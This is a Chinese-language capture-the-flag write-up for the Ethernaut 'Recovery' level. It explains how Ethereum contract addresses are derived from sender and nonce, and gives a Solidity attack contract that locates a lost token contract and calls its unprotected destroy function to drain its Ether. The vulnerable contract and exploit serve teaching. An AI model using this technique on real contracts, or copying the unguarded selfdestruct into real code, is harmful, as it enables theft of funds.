# Recovery
Recovery要求我們回復在合約中的0.001個Ether，讓我們看一下代碼。

## 合约代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```
## 代碼分析
我們在這一關從console中獲得的instance address是Recovery合約的地址，而它部署的SimpleToken合約我們并不知道地址。如果不知道地址，我們就無法調用SimpleToken合約中的destroy函數用selfdestruct返還給我們代幣。這裏就需要我們瞭解合約地址生成的規律。
根據[以太坊黃皮書](https://ethereum.github.io/yellowpaper/paper.pdf),賬號地址生成的規律是：
>The address of the new account is defined as being the rightmost 160 bits of the Keccak-256 hash of the RLP encoding of the structure containing only the sender and the account nonce.
簡單來説就是將sender的地址和交易nonce以RLP編碼后，對其進行Keccak-256哈希，然後取哈希值的右邊20bytes作為新賬號的地址。
在獲取到SimpleToken的合約地址以後，我們就可以調用SimpleToken合約中的destroy函數，將合約銷毀，並且將合約中的0.001個Ether返還給我們。

## 攻擊代碼
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IRecovery {
    function destroy(address payable _to) external;
}


contract Recoverycontract {
    function cal_contract_address(address _from, uint256 nonce) external pure returns(address) {
        address target = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _from, bytes1(uint8(nonce)))))));
        return target;
    }

    function recovery(address _target) public {
        IRecovery(_target).destroy(payable(msg.sender));
    }
}

## 攻擊過程
1.部署Recoverycontract合約，並且調用cal_contract_address函數，將instance的合約地址和nonce(即1）作爲入參，獲取SimpleToken合約的地址。
2.將SimpleToken合約的地址作爲入參調用recovery函數，完成任務。


